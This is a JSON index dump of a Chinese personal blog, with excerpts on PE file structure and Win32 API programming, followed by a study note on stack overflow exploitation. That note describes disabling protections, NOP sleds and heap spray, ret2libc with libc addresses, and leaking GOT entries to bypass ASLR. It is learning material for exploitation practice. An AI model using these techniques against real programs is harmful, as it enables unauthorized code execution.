想要获得RVA对应的文件偏移，唯一的办法就是：如果目标RVA在某个节中，用目标RVA减去节的起始RVA’，获得数据在节中的偏移量。再通过PointerToRawData获得节在文件中的偏移，加上刚刚获得的偏移就是文件偏移量。   导入表   导入函数组成导入表，导入函数就是被程序调用的函数，但其代码不在程序中，这些代码位于一个或多个DLL中，调用程序中只保留一些函数信息。 只有当PE文件装载入内存的时候，Windows装载器才将DLL装入，并调用导入函数指令和函数实际地址，这就是动态链接，这是依靠PE文件中的导入表来完成的。   导入表结构   导入表由一系列IMAGE_IMPORT_DESCRIPTOR结构组成，每个结构对应一个DLL文件，   struct IMAGE_IMPORT_DESCRIPTOR {     union         Characteristics         OriginalFirstThunk      指向包含一系列IMAGE_THUNK_DATA的数组（不会变）     TimeDateStamp     ForwarderChain     Name1                       对应的DLL名称     FirstThunk                  指向包含一系列IMAGE_THUNK_DATA的数组（会改变） }   IMAGE_THUNK_DATA的数组中每个元素定义了一个导入函数的信息，并且以0结尾。 当最高位为1时，表示函数以序号方式导入，这时结构体的值是函数的序号。 当最高位为0时，表示函数以字符串类型的函数名方式导入，这时结构体的值是个RVA，指向一个用来定义导入函数名称的IMAGE_IMPORT_BY_NAME结构。   struct IMAGE_IMPORT_BY_NAME {     Hint    函数的序号，可选字段     Name1   导入函数的名称字符串，以0结尾。 }   当PE文件装载入内存时，FirstThunk所指向的数组的值都被替换成了真正的函数入口地址，这样做的目的是可以反过来查询地址的对应导入函数名。   导入地址表 IAT   把FirstThunk所指向的数组称为导入地址数组。在PE文件中，所有DLL对应的导入地址数组在位置上排列在一起，数组的组合称为导入地址表IAT。 导入表中第一个IMAGE_IMPORT_DESCRIPTOR结构的FirstThunk指向的就是IAT的起始地址。 或者可以通过数据目录表，查找数据目录表中第13项（索引值为12/IMAGE_DIRECTORY_ENTRY_IAT），直接用来定义IAT数据块的位置和大小。   导出表和重定位表   导出表   在包含导出函数的DLL中，导出信息位于导出表，通过导出表，DLL文件向系统提供导出函数的名称，序号和入口地址。以便完成动态链接。   重定位表   首先要明白，在X86下，涉及到直接寻址的指令都是要重定位的。   重定位算法   将直接寻址的指令中的双字地址减去建议装载地址，获得RVA，再加上模块的实际装入地址，获得VA。由于建议装载地址在PE文件头中，而实际装入地址由装载器决定，所以重定位所需要的只是需要修正的代码的地址。   重定位表的位置   一般单独存放在一个可以丢弃的.reloc节中，和资源差不多，不是必须的。重定位表的位置可以由数据目录表IMAGE_DATA_DIRECTORY结构获取。 获得重定位表位置后，地址指向的就是很多重定位块，每一块描述一个内存页的所有重定位项。每个重定位块分起始RVA和块长度，之后的重定位项低12位表示数据在当前页面中的RVA，高4为表示重定位项种类。 假设模块装入地址为00400000h处。                  重定位表偏移       数据       说明                       0000h       00001000h       第一个块，页面地址是00401000h                 0004h       00000010h       该重定位块长度10h                 0008h       3012h       重定位位置00401012h                 000ah       3040h       重定位位置00401040h                 000ch       306fh       重定位位置0040106fh                 000eh       0000h       用于对齐的空白数据                 0010h       00002000h       第一个块，页面地址是00402000h                 0014h       0000000ch       该重定位块长度0ch                 0018h       3080h       重定位位置00402080h                 001ah       30f0h       重定位位置004020f0h                 001ch       00000000h       重定位数据块结束标志           PE解析到这里就不详细讲了，以后若对这方面深入研究再说，具体资料可以查阅 WindowsPE权威指南。  ","categories": [],
        "tags": ["windows"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32ASM-2.html",
        "teaser":null},{
        "title": "Win32 Coding 1",
        "excerpt":"     window程序设计1 关于winmain和MessageBox API。    Winmain   #include &lt;windows.h&gt; int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,                    PSTR szCmdLine, int iCmdShow) {     MessageBox (NULL, TEXT (\"Hello, Windows 98!\"), TEXT (\"HelloMsg\"), 0);     return 0 ; }   WINDOWS.H是主要的含入文件，它包含了其它Windows表头文件，这些表头文件的某些也包含了其它表头文件。这些表头文件中最重要的和最基本的是：   WINDEF.H 基本型态定义。 WINNT.H 支持Unicode的型态定义。 WINBASE.H Kernel函数。 WINUSER.H 使用者接口函数。 WINGDI.H 图形设备接口函数。   WinMain函数声明为返回一个int值。WINAPI标识符在WINDEF.H定义，语句如下：   #define WINAPI \\_\\_stdcall   关于Winmain参数   第一个参数被称作「执行实体句柄」。同一应用程序的所有执行实体共享程序和只读的内存，程序通过检查hPrevInstance参数就能够确定自身的其它执行实体是否正在运行。在32位Windows版本中，该概念已被抛弃。 第二个参数总是NULL（定义为0）。 第三个参数是用于执行程序的命令列。某些Windows应用程序利用它在程序启动时将文件加载内存。 第四个参数指出程序最初显示的方式，可以是正常的或者是最大化地充满整个画面，或者是最小化显示在工作列中。   MessageBox   MessageBox函数用于显示短信息   MessageBox参数   第一个参数通常是窗口句柄，我们将在第三章介绍其含义。 第二个参数是在消息框主体中显示的字符串。 第三个参数是出现在消息框标题列上的字符串。在HELLMSG.C中，这些文字字符串的每一个都被封装在一个TEXT宏中。通常不必将所有字符串都封装在TEXT宏中，但如果想将程序转换为Unicode字符集，这确是一个好主意。 MessageBox的第四个参数可以是在WINUSER.H中定义的一组以前缀MB_开始的常数的组合。   #define     MB_OK                    0x00000000L #define     MB_OKCANCEL              0x00000001L #define     MB_ABORTRETRYIGNORE      0x00000002L #define     MB_YESNOCANCEL           0x00000003L #define     MB_YESNO                 0x00000004L #define     MB_RETRYCANCEL           0x00000005L   在本程序中，MessageBox返回数值1，但更严格地说它返回IDOK，IDOK在WINUSER.H中定义，等于1。根据在消息框中显示的其它按钮，MessageBox函数还可返回IDYES、IDNO、IDCANCEL、IDABORT、 IDRETRY或IDIGNORE。  ","categories": [],
        "tags": ["windows","WIN32"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32-coding-1.html",
        "teaser":null},{
        "title": "Win32 Coding 2",
        "excerpt":"     window程序设计2 关于unicode编码和宽字节    unicode字符变量   C中的宽字符基于wchar_t数据型态，它在几个表头文件包括WCHAR.H中都有定义   typedef unsigned short wchar_t ;   因此，wchar_t数据型态与无符号短整数型态相同，都是16位宽。 e.g: wchar_t * p = L”Hello!” wchar_t a[] = L”Hello!” 只有带有L，编译器才知道需要将字符串存为每个字符2字节。   宽字符处理   strlen函数的宽字符版是wcslen（wide-character string length：宽字符串长度），并且在STRING.H（其中也说明了strlen）和WCHAR.H中均有说明。   strlen函数说明如下： size_t __cdecl strlen (const char *) ;         而wcslen函数则说明如下： size_t __cdecl wcslen (const wchar_t *) ;     only one source code   为了避免建立两份一样的源代码而只为了字符的长度问题，一种方式是通过TCHAR.h头文件，通过unicode来区别是单字节还是多字节。如果定义了名为_UNICODE的标识符，并且程序中包含了TCHAR.H表头文件那么 _tcslen就定义为wcslen：   #define _tcslen wcslen   如果没有定义UNICODE，则_tcslen定义为strlen：   #define _tcslen strlen   TCHAR.H还用一个新的数据型态TCHAR来解决两种字符数据型态的问题。 如果定义了_UNICODE标识符，那么TCHAR就是wchar_t：   typedef wchar_t TCHAR   否则，TCHAR就是char   typedef char TCHAR   现在开始讨论字符串文字中的L问题。 如果定义了_UNICODE标识符，那么一个称作__T的宏就定义如下：   #define __T(x) L##x   这是相当晦涩的语法，但合乎ANSI C标准的前置处理器规范。那一对井字号称为「粘贴符号（token paste）」，它将字母L添加到宏参数上。因此，如果宏参数是”Hello!”，则L##x就是L”Hello!”。 如果没有定义_UNICODE标识符，则__T宏只简单地定义如下：   #define __T(x) x   关于UNICODE和_UNICODE的区别，前者没有下划线，专门用于Windows头文件；后者有一个前缀下划线，专门用于C运行时头文件。换句话说，也就是在ANSI C++语言里面根据_UNICODE（有下划线）定义与否，各宏分别展开为Unicode或ANSI字符，在Windows里面根据UNICODE（无下划线）定义与否，各宏分别展开为Unicode或ANSI字符。   windows常见处理方式   WINNT.H的前面包含C的表头文件CTYPE.H，这是C的众多表头文件之一，包括wchar_t的定义。WINNT.H定义了新的数据型态，称作CHAR和WCHAR：   typedef char CHAR typedef wchar_t WCHAR // wc   WINNT.H表头文件进而定义了可用做8位字符串指针的六种数据型态和四个可用做const 8位字符串指针的数据型态。这里精选了表头文件中一些实用的说明数据型态语句：   typedef CHAR *PCHAR, *LPCH, *PCH, *NPSTR, *LPSTR, *PSTR typedef CONST CHAR *LPCCH, *PCCH, *LPCSTR, *PCSTR   前缀N和L表示「near」和「long」，指的是16位Windows中两种大小不同的指针。在Win32中near和long指针没有区别。   类似地，WINNT.H定义了六种可作为16位字符串指针的数据型态和四种可作为const 16位字符串指针的数据型态：   typedef WCHAR *PWCHAR, *LPWCH, *PWCH, *NWPSTR, *LPWSTR, *PWSTR ; typedef CONST WCHAR *LPCWCH, *PCWCH, *LPCWSTR, *PCWSTR ;   通过unicode来确定指向是ascii还是unicode：   #ifdef  UNICODE typedef WCHAR TCHAR, * PTCHAR ; typedef LPWSTR LPTCH, PTCH, PTSTR, LPTSTR ; typedef LPCWSTR LPCTSTR ; #else typedef char TCHAR, * PTCHAR ;   typedef LPSTR LPTCH, PTCH, PTSTR, LPTSTR ; typedef LPCSTR LPCTSTR ; #endif   windows函数调用   关于messagebox   MessageBox函数定义如下：   int WINAPI MessageBox (HWND, LPCSTR, LPCSTR, UINT) ;   注意，函数的第二个、第三个参数是指向常数字符串的指针。 USER32.DLL中，没有32位MessageBox函数的进入点。实际上，有两个进入点，一个名为MessageBoxA（ASCII版），另一个名为MessageBoxW（宽字符版）。 通常不必关心这个问题，程序中只需使用MessageBox。   下面是MessageBoxA和MessageBoxW在WINUSER.H中定义的方法：   WINUSERAPI int WINAPI MessageBoxA (HWND hWnd, LPCSTR  lpText, LPCSTR  lpCaption, UINT uType) ; WINUSERAPI int WINAPI MessageBoxW (HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) ;   注意，MessageBoxW函数的第二个和第三个参数是指向宽字符的指针。   常用字符串API   如果定义了UNICODE标识符，那么这些函数将接受宽字符串，否则只接受常规字符串。   ILength = lstrlen (pString) ; pString = lstrcpy (pString1, pString2) ; pString = lstrcpyn (pString1, pString2, iCount) ; pString = lstrcat (pString1, pString2) ; iComp = lstrcmp (pString1, pString2) ; iComp = lstrcmpi (pString1, pString2) ;   关于printf   Windows中没有标准输入和标准输出的概念。Windows程序中只能使用fprintf，而不是printf。 但是可以使用sprintf及sprintf系列中的其它函数来显示文字。这些函数除了将内容格式化输出到函数第一个参数所提供的字符串缓冲区以外，其功能与printf相同。 在Windows中，使用MessageBox显示结果优于puts。 可以自定义MessageBoxPrintf函数，调用sprintf来格式化，并通过messagebox输出。  ","categories": [],
        "tags": ["windows","WIN32"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32-coding-2.html",
        "teaser":null},{
        "title": "Win32 Coding 3",
        "excerpt":"     window程序设计3 窗口与消息 建立窗口很简单，只需调用CreateWindow函数即可-_-    总体结构（重要！）   进行Windows程序设计，实际上是在进行一种对象导向的程序设计（OOP）。这一点在Windows中使用得最多的对象上表现最为明显。 桌面上最明显的窗口就是应用程序窗口。这些窗口含有显示程序名称的标题列、菜单甚至可能还有工具列和滚动条。另一类窗口是对话框，它可以有标题列也可以没有标题列。 窗口以「消息」的形式接收窗口的输入，窗口也用消息与其它窗口通讯。   窗口过程   程序建立的每一个窗口都有相关的窗口消息处理程序。这个窗口消息处理程序是一个函数，既可以在程序中，也可以在动态链接库中。Windows通过呼叫窗口消息处理程序来给窗口发送消息。窗口消息处理程序根据此消息进行处理，然后将控制传回给Windows。   窗口   窗口总是根据窗口类来创建的，窗口类标识了传递给窗口的窗口处理函数。并且允许窗口使用同一个窗口过程。在对象导向的程序设计中，对象是程序与数据的组合。窗口是一种对象，其程序是窗口消息处理程序。数据是窗口消息处理程序保存的信息和Windows为每个窗口以及系统中那个窗口类别保存的信息。   窗口消息处理程序处理给窗口发送消息。这些消息经常是告知窗口，使用者正使用键盘或者鼠标进行输入。这正是按键窗口知道它被「按下」的奥妙所在。在窗口大小改变，或者窗口表面需要重画时，由其它消息通知窗口。   消息循环与消息队列   Windows程序开始执行后，Windows为该程序建立一个「消息队列」。这个消息队列用来存放该程序可能建立的各种不同窗口的消息。程序中有一小段程序代码，叫做「消息循环」，用来从队列中取出消息，并且将它们发送给相应的窗口消息处理程序。有些消息直接发送给窗口消息处理程序，不用放入消息队列中。   窗口、窗口类、窗口消息处理过程、消息队列、消息循环和窗口消息的相互配合成就了Windows系统。   详细过程   要建立窗口，上面已经说了，首先要创建一个窗口类，并添加窗口过程。 对该例，可以看到winmain中没有调用wndproc函数，但是其中有一个对wndproc的引用。   重要的API   RegisterClass()     为程序的窗口注册一个窗口类 CreateWindow()      基于窗口类创建一个窗口 ShowWindow()        在屏幕中显示窗口 UpdataWindow()      指定窗口进行重绘 GetMessage()        从消息队列中获取消息 DispatchMessage()   将消息分发给窗口过程 DefWindowProc()     执行默认的消息处理   对于返回值和调用约定而言：WndProc的返回值是LRESULT等价于LONG，类型为CALLBACK,调用约定是__stdcall。 WinMain的类型是WINAPI，调用约定也是__stdcall。   理解结构与句柄   其中还使用了4种特殊的数据结构                  结构       含义                       MSG       消息结构                 WNDCLASS       窗口类结构                 PAINTSTRUCT       绘制结构                 RECT       矩形结构           |句柄|含义| |——–|—–:|:—-:| |HINSTANCE |实例句柄——程序本身| |HWND |窗口句柄| |HDC |设备句柄| 句柄本质上是引用某个对象的值，为32位DWORD。   窗口类的注册   窗口总是基于窗口类创建的，窗口类确定了窗口消息的窗口过程。 在创建窗口之前，必须调用RegisterClass来注册窗口类，参数是一个指向窗口类WNDCLASS结构的指针。   typedef struct tagWNDCLASSW {     UINT        style;          //窗口类风格     WNDPROC     lpfnWndProc;    //基于该窗口类的窗口过程长指针     int         cbClsExtra;     //预留的额外空间     int         cbWndExtra;     //预留的额外空间     HINSTANCE   hInstance;      //实例句柄     HICON       hIcon;          //图标句柄：设定图标     HCURSOR     hCursor;        //鼠标句柄：设定鼠标     HBRUSH      hbrBackground;  //刷子句柄：设定背景     LPCWSTR     lpszMenuName;   //设定窗口类菜单     LPCWSTR     lpszClassName;  //窗口类的名字 }   通常做法：定义一个窗口类的变量 WNDCLASS wndclass，然后对该结构的10个字段进行初始化，并调用RegisterClass。最重要的2个字段是第二个和最后一个。 wndclass.lpfnWndProc=WndProc，则wndproc将处理所有基于该窗口类创建的窗口的所有消息。实际是函数指针。 将10个字段初始化之后，调用RegisterClass就可以注册窗口类，唯一的参数是指向wndclass的指针。为了防止调用RegisterClass出错，进行一下异常处理。如果为了防止出现其他错误，则利用函数GetLastError可以获知错误原因。   创建窗口   窗口类只是定义窗口的一般特性，基于窗口类可以创建不同的窗口。调用CreateWindow创建窗口时，可以指定与窗口有关的细节。 调用该函数通过独立参数指定。第一个参数是窗口类名称，通过这种方式与窗口类建立联系。程序实例句柄为WinMain中的句柄参数。该函数的返回值是指向该窗口的句柄。在windows中每一个窗口都有句柄，在程序中可以用句柄来对窗口进行引用。   显示窗口   当CreateWindow完成后，OS已经为窗口分配了内存空间。为了显示在桌面上，需要调用ShowWindow。   ShowWindow(HWND hWnd,int nCmdShow);   第一个参数指向窗口句柄，第二个是WinMain接受的值，决定这窗口的初始显示方式。 UpdateWindow(hwnd)将重绘客户区。   消息循环   在UpdataWindow之后，窗口在屏幕中就可见了。这时程序必须维护一个消息队列，用于接受键盘输入和鼠标输入。当输入事件发生后，windows会自动将这些事件转换成消息，放置在程序的消息队列中。   while (GetMessage(&amp;msg, NULL, 0, 0)) { \tTranslateMessage(&amp;msg); \tDispatchMessage(&amp;msg); }   程序通过这段消息循环来从消息队列中获取消息。第一个参数是MSG的变量，第二、三、四为NULL和0，表示程序获取该程序所创建的所有窗口的消息。 MSG的结构:   typedef struct tagMSG {     HWND        hwnd;           //消息指向的窗口句柄     UINT        message;        //消息标识符,WM_标识     WPARAM      wParam;         //DWORD消息参数     LPARAM      lParam;         //DWORD消息参数     DWORD       time;           //信息进入消息队列的时间     POINT       pt;             //消息进入消息队列的位置 } MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG; typedef struct tagPOINT {     LONG  x;            //鼠标x坐标     LONG  y;            //鼠标y坐标 } POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT;   如果消息队列中的消息不等于WM_QUIT 0x12，则GetMessage将返回非0值，进行循环判断。 TranslateMessage(&amp;msg)用来将键盘输入进行转换。DispatchMessage(&amp;msg)将msg结构再次返回给windows。 windows将根据消息发送到适当的窗口过程来处理，也就是说是windows调用了窗口过程。 当窗口过程处理完毕后，控制权转回windows，而windows将为DispatchMessage继续提供服务，结束之后，进行下一轮GetMessage调用。   窗口过程   到现在，已经了解了注册窗口类，创建窗口，在屏幕中显示窗口，程序进入消息循环，从消息队列中检索消息。 程序可以包含多个窗口过程，但是一个窗口过程总是和一个通过调用RegisterClass注册的特定的窗口类相关联。CreateWindow基于特定的窗口类创建窗口。 所以一个窗口类可以创建多个窗口，但是这些窗口的窗口过程都应该是同一个，即在窗口类中注册的那一个。   LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)   窗口过程的参数与MSG的前4个字段一致。分别是窗口句柄，消息标识符，2个DWORD的消息参数。 程序不直接对窗口过程进行调用，总是用windows调用完成。如果希望程序直接调用窗口过程，可以使用SendMessage来实现。   消息处理   对于消息的处理，由于WINUSER.H中定义了以WM开头的标识符，通常使用switch-case语句来确定窗口收到的消息。对于不进行处理的消息，使用默认窗口过程DefWindowProc来返回。   WM_CREATE(0x1)   这是窗口过程收到的第一个消息，当windows在WinMain中调用CreateWindow时，windows将窗口过程的第一个参数设置为该窗口的句柄，第二个参数为WM_CREATE，同时窗口过程对该消息进行处理，控制权返回给windows，继续执行WinMain。 通常情况下，窗口过程对这个消息进行处理时，对窗口进行一次性的初始化，处理完成后将返回0。   WM_PAINT(0xf)   窗口过程处理的第二个消息，当客户区部分或全部无效且必须更新时，意味着窗口必须重绘。 客户区为什么会无效？     当窗口首次被创建时，整个客户区都是无效的，第一条WM_PAINT将在UpdataWindow之后出现，指示窗口过程进行绘制。   调制窗口的大小时，客户区会无效。   最小化窗口，再恢复时，windows并不会保存客户区的内容，宣布窗口无效，在接受消息后，窗口过程负责重绘。   在拖动窗口导致窗口之间重叠时，windows不负责保存被重叠的部分，重叠部分不再被遮挡时，窗口被标记无效。   对该消息的处理框架：   hdc = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rect); DrawText(hdc, TEXT(\"Hello, Windows 10!\"), -1, &amp;rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hwnd, &amp;ps);   两个函数的第一个参数是窗口句柄，第二个是指向POINTSTRUCT的指针，其包含窗口过程来对客户区进行重绘。 在BeginPaint调用期间，windows会对客户区进行擦除，使用注册窗口类指定的刷子，将使整个客户区有效，并返回设备环境句柄，通过设备环境句柄来显示，无法在客户区外绘制，EndPaint用于释放设备环境句柄，使其无效。 如果不对WM_PAINT消息进行处理，则必须交给DefWindowProc处理。 GetClientRect第一个是窗口句柄，第二个是RECT的矩形结构指针。 DrawText功能就是绘制文本，第一个参数是设备环境句柄，第二个是文本，第三个是-1，表示以0结尾。最后的标识使文本单行显示，并且水平和垂直居中。   WM_DESTORY(0x2)   该消息表示windows正常销毁窗口，比如关闭窗口时，发出该消息。通过调用PostQuitMessage(0)将WM_QUIT消息插入消息队列，之后GetMessage获取消息，退出消息循环。程序最后返回 msg.wParam ，通常是0，来结束WinMain。   总结      窗口过程WndProc总是和RegisterClass的注册窗口类关联，基于该窗口类的窗口使用窗口类指定的窗口过程来对消息进行处理。windows通过调用窗口过程来向窗口发送消息。   WndProc什么时候被windows调用？新建窗口，关闭窗口，窗口大小变动，窗口移动，在客户区发生操作，客户区需要重绘时等等。   窗口过程可以为基于同一窗口类创建的窗口处理消息，即通过hwnd参数，知道是哪个窗口接受消息。   队列与非队列消息   队列消息就是从消息队列中GetMessage检索出来的，从而投递到窗口过程中。非队列消息是指windows对窗口过程的直接调用，消息被直接发送到窗口过程，比如WM_CREATE和WM_PAINT。窗口过程会接受所有的消息，是窗口的消息中心。  ","categories": [],
        "tags": ["windows","WIN32"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32-coding-3.html",
        "teaser":null},{
        "title": "Win32 Coding 4",
        "excerpt":"    window程序设计4 文本输出    WM_PAINT消息   大多数windows程序会在WinMain初始化进入消息循环之前调用UpdateWindow函数，windows利用这个机会传递最初的WM_PAINT消息。      移动窗口   调整大小   滚动客户区   调用API显示发送WM_PAINT消息   有效与无效矩形   窗口过程并不是更新整个客户区，通常只需要更新其中一部分，最常见的是更新一个矩形区域。 需要被重新绘制的区域被称为无效区域，客户区有无效区域导致windows在消息队列中放置一条WM_PAINT消息。 windows内部为每个窗口保存了一个绘制消息结构，保存着可以覆盖该区域的最小矩形，称之为无效矩形。若有多个无效矩形，窗口过程在处理WM_PAINT消息之前，windows会更新矩形大小，不会在消息队列中放置多条WM_PAINT消息。 窗口过程可以调用InvalidateRect函数来强制使矩形失效，调用BeginPaint使整个客户区有效。   关于GUI   绘制窗口的客户区需要调用windows的图形接口函数，比如DrawText，最常用的是TextOut。   TextOut (hdc, x, y, psText, iLength)   TextOut向客户区输出一个字符串，psText是指向字符串的指针，iLength是长度，x和y是坐标，hdc是设备环境句柄。   关于设备环境句柄HDC   首先句柄是一个32DWORD的值，windows使用句柄来确定一个对象，设备环境句柄和特定的设备相关联。 设备环境的某些值决定了GUI函数工作的具体细节，包括文本颜色，字体，大小。 程序在绘制前必须获取设备环境句柄，当完成绘制之后，必须释放设备环境句柄。释放之后，句柄不再有效也不能再被使用。   获取设备环境句柄_方式一   在对WM_PAINT消息处理时候，BeginPaint函数对指定的窗口句柄擦去无效区域，填充ps各个字段的值，同时返回一个hdc，此后，程序可以通过引用这个hdc来对设备环境句柄进行操作。调用EndPaint来释放设备环境句柄。 常用框架：   case WM_PAINT:     hdc = BeginPaint (hwnd, &amp;ps) ;     使用GDI函数     EndPaint (hwnd, &amp;ps) ; return 0 ;   绘制信息结构PAINTSTRUCT   typedef struct tagPAINTSTRUCT     {     HDC         hdc ;         BOOL        fErase ;         RECT        rcPaint ;         BOOL        fRestore ;         BOOL        fIncUpdate ;         BYTE        rgbReserved[32] ;     } PAINTSTRUCT ;   程序只使用前三个字段，其它字段由Windows内部使用。hdc是设备环境句柄。在大多数情况下， fErase被标志为FALSE(0)，这意味着Windows已经擦除了无效矩形的背景。   InvalidateRect (hwnd, NULL, TRUE) ;   在调用BeginPaint之前调用该函数可以在该更新矩形之外绘制。这个调用使整个客户区无效化，调用BeginPaint擦除原有背景。如果设置为FALSE，则BeginPaint不会擦除背景，原来背景被保留。 通常做法：简单的重绘整个客户区，重绘一部分并不实际。   获取设备环境句柄_方式二   在对WM_PAINT消息进行处理时绘制客户区是很有用的，但是在处理其他消息时候，也需要设备环境句柄，可以调用GetDC函数。   hdc = GetDC (hwnd) ; 使用GUI函数 ReleaseDC (hwnd, hdc) ;   注意该函数返回的设备环境句柄中的剪裁矩形是整个客户区，GetDC不会使无效矩形有效化，如果需要将客户区有效化，使用ValidateRect (hwnd, NULL)，通常这两个函数用户处理键盘鼠标消息，而不必为了生成WM_PAINT消息刻意使客户区一部分无效化。 类似的GetDC函数GetWindowDC函数，返回整个窗口的设备环境句柄（包括任务栏等），可以处理WM_NCPAINT消息。   讨论TextOut函数   TextOut (hdc, x, y, psText, iLength)第一个是设备环境句柄，设备环境决定了输出文字的样式。 设备环境句柄同时定义了一个裁剪区域，GetDC返回的是整个客户区，从BeginPaint返回到就是无效区域。TextOut只会在裁剪区域中输出。   系统字体   windows默认的字体是系统字体，或称为SYSTEM_FONT,系统字体是点阵字体，由像素点构成。 为了输出多行文本，需要知道文本中字符的大小，由字符的高度可以决定下一行文字的位置，可以通过GetSystemMetrics函数来获取用户的界面尺寸。同样可以通过GetTextMertics获取程序的字体大小，windows把字符尺寸的各种值复制到类型为TEXTMETRIC的结构中，   typedef struct tagTEXTMETRIC {     LONG tmHeight ;     LONG tmAscent ;     LONG tmDescent ;     LONG tmInternalLeading ;     LONG tmExternalLeading ;     LONG tmAveCharWidth ;     LONG tmMaxCharWidth ;     其他结构字段 } TEXTMETRIC, * PTEXTMETRIC ;   要使用GetTextMetrics 函数前，定义TEXTMETRIC tm ; 在需要确定文本的大小前，需要首先获取设备环境句柄，然后调用GetTextMetrics：   hdc = GetDC (hwnd) ; GetTextMetrics (hdc, &amp;tm) ; ReleaseDC (hwnd, hdc) ;   之后就可以确定字体的大小。 详细的这部分我不记了，比较繁琐。如果专门改变字体可以看这部分。   文本格式化  ","categories": [],
        "tags": ["windows","WIN32"],
        "url": "https://zjgcjy.github.io/posts/2017-09/Win32-coding-4.html",
        "teaser":null},{
        "title": "Stackoverflow 1",
        "excerpt":"     栈溢出学习-_- 学习基本的栈溢出，加了栈保护DEP，堆栈不可执行NX，内存地址随机化ASLR等各种保护之后怎么绕过。    名词解释   CANARY   金丝雀值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警，类似于windows GS技术，当栈溢出发生时，canary值将在已保存的指令指针被重写前先改变。系统检测这个值是否改变，栈溢出发生了，保存的指令指针可能也被修改了，因此不能安全返回，函数会调用__stack_chk_fail函数。这个函数会丢出一个错误然后退出进程。缺点：仅保护了sip，未保护应用变量，覆写GOT绕过。   FORTIFY   Compile Time Buffer Checks，确定函数执行栈的大小，以避免缓冲区溢出攻击。   NX   No Execute.现代处理器支持一种称为NX的特性使得系统控制各部分的执行的内存。即程序栈不可执行。   PIE   随机化加载程序的内存地址。   RELRO   RELocation Read-Only (RELRO) 重定位只读，它能够保护库函数的调用不受攻击者重定向的影响。   基础栈溢出   gcc 编译 -fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector   gcc -fno-stack-protector -z execstack -m32 -o level1 level1.c   同时关掉整个linux系统的ASLR保护。   这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？ 最简单的方法就是开启core dump这个功能。   ulimit -c unlimited sudo sh -c 'echo \"/tmp/core.%t\" &gt; /proc/sys/kernel/core_pattern'   挂载程序 之前要安装socat   socat TCP4-LISTEN:10001,fork EXEC:./level1   但是试了很久，硬编码的ret地址不对。。   关于shellcode   为了通用性，我们通常会在shellcode一开始就大范围抬高栈顶，从而达到保护自身安全的目的 mov eax,esp 和 jmp eax 也可以完成进入栈区的功能 扩大shellcode面积，提高命中率（函数返回时，只要能击中nop区shellcode就能执行） 大面积“扫射”返回地址（用一大片返回地址来覆盖真正的返回地址，增加命中的成功率） 解决字节错位：不同的主机会有不同的安装目录，可能导致覆盖的地址错位失效，使用按字节相同的双字节跳转地址，甚至可以使堆中的地址，然后想办法将shellcode用堆扩展的办法放置在响应的区域，这种heap spray的办法经常在IE漏洞中使用   Ret2libc：开启NX（DEP）的栈溢出   这时候查看进程布局，发现堆栈是不可执行的。 那么如何执行shellcode呢？我们知道stack2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行 system(“/bin/sh”) 的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。 如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。 我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp 要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就随便写了一个0xdeadbeef作为返回地址。 测试了没什么大问题，就是system执行完成后的返回地址位置，导致在sh中执行exit会出错这点未知。   开启NX（DEP）和aslr   那么如何解决地址随机化的问题呢？思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和 /bin/sh 字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的   objdump -d -j .plt stack3   我们发现除了程序本身的实现的函数之外，我们还可以使用 read@plt() 和 write@plt() 函数。但因为程序本身并没有调用 system() 函数，所以我们并不能直接调用 system() 来获取shell。但其实我们有 write@plt() 函数就够了，因为我们可以通过 write@plt () 函数把 write() 函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的 write@plt() 函数为什么也能实现 write() 功能呢? 这是因为linux采用了延时绑定技术，当我们调用 write@plit() 的时候，系统会将真正的 write() 函数地址link到got表的 write.got 中，然后 write@plit() 会根据 write.got 跳转到真正的 write() 函数上去。  ","categories": [],
        "tags": ["pwn","stack"],
        "url": "https://zjgcjy.github.io/posts/2017-10/stackoverflow-1.html",
        "teaser":null},{
        "title": "Stackoverflow 2",
